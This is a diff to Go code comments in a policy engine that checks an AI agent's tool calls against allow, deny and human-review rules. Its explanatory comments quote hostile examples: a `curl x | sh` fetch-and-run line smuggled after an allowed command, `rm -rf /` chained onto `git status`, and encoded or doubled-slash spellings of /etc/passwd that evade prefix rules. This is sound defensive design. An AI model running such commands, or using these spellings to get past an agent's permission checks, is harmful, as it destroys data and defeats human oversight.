@@ -24,10 +24,11 @@
 //
 // A spelling the allow rule doesn't name reaches a person instead of slipping
 // past a deny rule; cleaning never loosens, so even "/WORKSPACE/x" does. Add a
-// firm rule on facts.ambiguous_path (see AmbiguousPath) so that a short name
-// or variable inside an allowed folder reaches a person too. Links remain:
-// the server that opens the file must check the real path against its roots
-// (see "Path arguments" in docs/architecture.md).
+// firm-wide rule on facts.ambiguous_path (see AmbiguousPath) so that a short
+// name or variable inside an allowed folder reaches a person too. That still
+// leaves links (a symlink inside /workspace/ can point anywhere): the server
+// that opens the file must check the real path against its roots (see "Path
+// arguments" in docs/architecture.md).
 package policy
 
 import (
@@ -63,12 +64,14 @@ const (
 //   - in: Value is a list (any slice or array) and the field's text equals one
 //     item's text
 //   - command: the field is a shell command line, and each command in it
-//     matches one of Value's patterns (one, or a list), word for word; see
-//     ParseCommandValue. It reads the field as sent in every pass of
-//     Evaluate, never cleaned. Use it to allow commands, where prefix and
-//     contains, which compare text, let more run ("contains gh pr merge"
-//     also matches `curl x | sh; echo gh pr merge`); not to deny or hold,
-//     where it would miss a line with one more command in it
+//     matches one of Value's patterns (one pattern, or a list), word for
+//     word; see ParseCommandValue. With Value ["git status", "git diff *"],
+//     `git status && git diff x` matches and `git status; rm -rf /` doesn't.
+//     It reads the field as the agent sent it, never cleaned, in every pass
+//     of Evaluate. Use it to allow commands: prefix and contains compare
+//     text, so they let more run ("contains gh pr merge" also matches
+//     `curl x | sh; echo gh pr merge`). Don't use it to deny or hold: it
+//     would miss a line with one more command in it
 //
 // Text is a string as is, a number in plain decimal without exponent or
 // trailing zeros (1000000, 2.5, 0.00001), a boolean as "true" or "false", and
@@ -81,8 +84,9 @@ const (
 // agent sent it. Evaluate also tries those on args against cleaned-up text:
 // lower case, single spaces, decoded %XX escapes, no invisible characters,
 // file URLs as paths; and then once more with paths tidied (Windows ones
-// too). A rule's values and field names are cleaned the same way. Facts are
-// the embedder's own and are never cleaned.
+// too). So the argument "%2FETC%2F/passwd" is also read as "/etc//passwd",
+// and then as "/etc/passwd". A rule's values and field names are cleaned the
+// same way. Facts are the embedder's own and are never cleaned.
 type Cond struct {
 	Field string `json:"field"`
 	Op    string `json:"op"`
@@ -135,7 +139,10 @@ var strictness = map[Action]int{ActionAllow: 1, ActionNotify: 2, ActionHuman: 3,
 // arguments and the rules' values cleaned up (case, spaces, %XX escapes,
 // invisible characters), and with paths cleaned too (detours, Windows
 // spellings). A later answer replaces the one so far only when it is
-// stricter and comes from a different rule.
+// stricter and comes from a different rule. For example, with a deny rule
+// on args.path prefix "/etc/" and an allow rule for everything else, the
+// path "//etc/passwd" is allowed as sent but denied once paths are
+// cleaned, so the answer is deny.
 //
 // The judge is asked at most once per rule. The cleaned passes reuse the real
 // verdict for every judge rule the first pass asked, and send a judge rule
@@ -146,6 +153,8 @@ func Evaluate(ctx context.Context, firm, agent []Rule, c Call, judge Judge) Resu
 		action Action
 		err    error
 	}
+	// The first pass, on the call as sent, records each verdict the judge
+	// gives, so the cleaned passes can reuse it instead of asking again.
 	var verdicts []asked
 	recording := judge
 	if judge != nil {
@@ -157,6 +166,7 @@ func Evaluate(ctx context.Context, firm, agent []Rule, c Call, judge Judge) Resu
 	}
 	best := evaluate(ctx, firm, agent, c, recording, nil)
 
+	// The cleaned passes: plainText alone, then with paths cleaned too.
 	replay := func(_ context.Context, r Rule) (Action, error) {
 		for _, v := range verdicts {
 			if reflect.DeepEqual(v.rule, r) {
@@ -278,13 +288,17 @@ func glob(g, s string) bool {
 	return re.(*regexp.Regexp).MatchString(s)
 }
 
+// condOK reports whether one condition holds for the call as sent, with
+// nothing cleaned.
 func condOK(c Cond, call Call) bool { return condMatches(c, call, nil) }
 
 // condMatches reports whether one condition holds. With a cleaner, a
 // condition on args is tried against every argument its field names once
 // keys are cleaned, with the argument and the rule's values cleaned the same
-// way, so "args.Path prefix /ETC/" lines up with "path": "//etc/passwd".
-// Facts are compared as they are in every pass.
+// way. So in the pass that cleans paths, args.Path prefix "/ETC/" holds for
+// the argument "path": "//etc/passwd": the field name, the value and the
+// argument are cleaned to path, /etc/ and /etc/passwd. Facts are compared as
+// they are in every pass.
 func condMatches(c Cond, call Call, clean *cleaner) bool {
 	// A command condition reads the line exactly as the shell will, in
 	// every pass: cleaning would change the words it matches.
@@ -306,7 +320,8 @@ func condMatches(c Cond, call Call, clean *cleaner) bool {
 }
 
 // compare applies c's operator to a field's value v, taking the text of v
-// and of c's values with spell.
+// and of c's values with spell: text, for the text as sent, or a cleaner's
+// spelling of it.
 func compare(c Cond, v any, spell func(any) string) bool {
 	switch c.Op {
 	case "eq":
